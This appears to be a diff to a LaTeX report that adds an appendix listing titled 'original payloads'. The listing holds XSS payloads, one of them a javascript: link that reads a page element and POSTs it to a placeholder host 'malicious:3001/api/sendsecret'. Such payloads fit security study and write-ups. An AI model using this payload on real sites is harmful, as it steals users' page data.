@@ -1,3 +1,9 @@
 \section{Attachments}
 some attachment...
 
+
+\begin{lstlisting}[style=basicStyle, caption=original payloads, label=lst:originalpayloads]
+XSS payloads:
+alert("XSS")
+<a href="javascript:var secret = document.getElementsByName('name')[0].innerHTML;var data = {body:secret,method:'POST'};fetch('http:\//malicious:3001/api/sendsecret', data)">ClickMeFor$</a>
+\end{lstlisting}
